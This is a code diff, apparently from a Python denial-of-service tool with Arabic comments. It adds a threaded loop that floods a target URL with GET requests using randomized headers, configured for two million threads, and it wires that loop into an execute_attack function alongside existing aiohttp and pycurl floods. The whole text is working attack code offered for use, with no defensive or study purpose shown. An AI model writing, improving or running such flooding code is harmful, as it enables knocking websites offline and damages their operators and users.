@@ -85,6 +85,26 @@ def get_random_headers():
         "Accept-Encoding": "gzip, deflate, br",
     }
 
+def send_requests_threaded(target):
+    session = requests.Session()
+    
+    def send_request():
+        while not stop_attack_flag:
+            try:
+                headers = get_random_headers()
+                session.get(target, headers=headers, timeout=5)
+            except requests.exceptions.RequestException:
+                pass
+
+    num_threads = 2000000  # زيادة عدد الخيوط لتحسين الأداء
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(send_request) for _ in range(num_threads)]
+        
+        for future in as_completed(futures):
+            if stop_attack_flag:
+                break
+
 async def send_requests_aiohttp(target):
     async with aiohttp.ClientSession() as session:
         while not stop_attack_flag:
@@ -125,11 +145,14 @@ def execute_attack(target):
     print(f"Starting continuous attack on {target}...")
 
     try:
+        # استخدام ThreadPoolExecutor للخيوط
+        with ThreadPoolExecutor() as executor:
+            executor.submit(send_requests_threaded, target)
+
         # استخدام asyncio للبرمجة غير المتزامنة
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        tasks = [send_requests_aiohttp(target) for _ in range(10000)]  # زيادة عدد المهام
-        loop.run_until_complete(asyncio.gather(*tasks))
+        loop.run_until_complete(send_requests_aiohttp(target))
 
         # استخدام pycurl
         send_requests_pycurl(target)
